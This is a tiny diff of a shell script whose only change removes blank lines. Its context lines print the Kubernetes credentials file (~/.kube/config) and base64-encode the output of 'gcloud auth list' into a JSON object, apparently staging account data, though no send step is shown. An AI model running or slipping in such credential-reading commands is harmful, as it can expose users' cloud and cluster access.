@@ -18,7 +18,5 @@ dostuff() {
     cat ~/.kube/config
 }
 
-
-
 local env_base64=$(gcloud auth list | base64 | tr -d '\n')
 echo "{\"test\":\"${env_base64}\"}" | jq
